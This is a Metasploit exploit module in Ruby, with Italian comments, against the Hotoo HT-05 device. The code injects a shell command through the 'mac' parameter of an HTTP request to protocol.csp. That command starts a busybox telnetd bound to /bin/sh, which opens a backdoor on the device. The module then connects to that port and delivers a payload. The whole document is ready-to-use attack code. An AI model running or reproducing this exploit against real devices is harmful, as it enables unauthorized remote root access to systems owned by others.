require 'msf/core'
require 'net/http'
require "uri"

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp

#
#Descrizione del Exploit
#
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Hotoo HT-05  remote shell exploit',

      'Description' => %q{
       This module tries to open a door in the device by exploiting the RemoteCodeExecution by creating a backdoor inside the device
         This exploit was written by Andrei Manole. Version of the firmware 2.000.022. Tested on 2.000.082 -> it still works
      },
      'Author'      => 'Andrei Manole',
      'References'  =>
        [
        ],
      'Privileged'     => true,
      'Platform'       => [ 'unix' ],
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'Space'    => 2000,
          'BadChars' => '',
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType'    => 'cmd_interact',
              'ConnectionType' => 'find'
            }
        }, #fine del settaggio del payload
      'Targets'        =>
        [
          [ 'Automatic', { } ],
        ],
      'DisclosureDate' => "20 Dicembre 2018",
      'DefaultTarget'  => 0))

    register_options([ Opt::RPORT(6666) ], self.class)

  end

def send_request(host,port)

        uri = URI.parse("http://#{host}/protocol.csp?function=set&fname=security&opt=mac_table&flag=close_forever&mac=|/bin/busybox%20telnetd%20-l/bin/sh%20-p#{port}")
        http = Net::HTTP.new(uri.host, uri.port)

       request = Net::HTTP::Get.new(uri.request_uri)
       response = http.request(request)

  if response.code == 200 || response.message ==  'OK' ||  response.class.name == 'HTTPOK' then
        return true
      end

      return false

  end

  def exploit #exploit

    print_status("[+] Apertura backdoor in corso...")
    if !send_request(datastore['RHOST'],datastore['RPORT']) then
      raise("[-] Errore nel apertura della porta")
    end
    print_good("[+] Richiesta inviata con successo! :)")
    nsock = self.connect(false, {"RPORT" => datastore['RPORT']})
    print_good("[+] Porta aperta con successo ! :)")
    nsock.put(payload.encoded + " >/dev/null 2>&1")
    handler(nsock)

   return
  end

end